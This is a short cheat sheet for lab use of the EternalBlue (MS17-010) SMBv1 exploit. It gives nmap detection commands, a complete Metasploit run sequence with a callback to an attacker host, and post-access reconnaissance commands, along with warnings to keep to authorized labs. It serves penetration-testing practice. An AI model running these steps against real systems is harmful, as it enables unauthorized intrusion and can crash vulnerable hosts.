# EternalBlue Cheat Sheet

Use only in isolated, authorized labs. EternalBlue targets old SMBv1 systems and can crash vulnerable hosts.

## What It Is

EternalBlue refers to MS17-010 SMBv1 vulnerabilities affecting older Windows systems. In labs, it is commonly associated with Windows 7 / Server 2008-era targets.

## Identify Exposure

```bash
nmap --script smb-vuln-ms17-010 -p445 ip
nmap -sC -sV -p445 ip
```

Check for:

- SMBv1 enabled
- old Windows builds
- port `445` exposed
- lab target explicitly intended for MS17-010

## Metasploit Lab Flow

```text
msfconsole
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS ip
set LHOST attacker_ip
check
run
```

## Non-Metasploit Lab Flow

Use only exploit code that matches the OS/build and architecture. Read the exploit requirements first; many public scripts require editing the callback command or payload function.

## After Access

- `whoami`
- `hostname`
- `ipconfig`
- `whoami /priv`
- collect flags or lab proof only

## Caution

- Unreliable exploit attempts can crash SMB or the whole host.
- Do not use against production systems.
- Prefer a VM snapshot before testing.

